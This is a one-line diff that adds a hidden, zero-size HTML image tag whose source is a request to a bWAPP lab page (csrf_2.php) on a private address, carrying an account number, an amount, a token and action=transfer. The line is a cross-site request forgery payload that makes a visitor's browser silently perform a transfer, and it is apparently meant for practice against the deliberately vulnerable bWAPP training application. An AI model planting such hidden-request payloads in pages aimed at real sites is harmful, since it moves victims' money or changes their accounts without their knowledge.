@@ -1,0 +1,1 @@
+<img src="http://192.168.20.205/bWAPP/csrf_2.php?account=123-45678-90&amount=100&token=c6fba2efae4298e835252cf95a517c46dbb67bff&action=transfer" height=0 width=0>
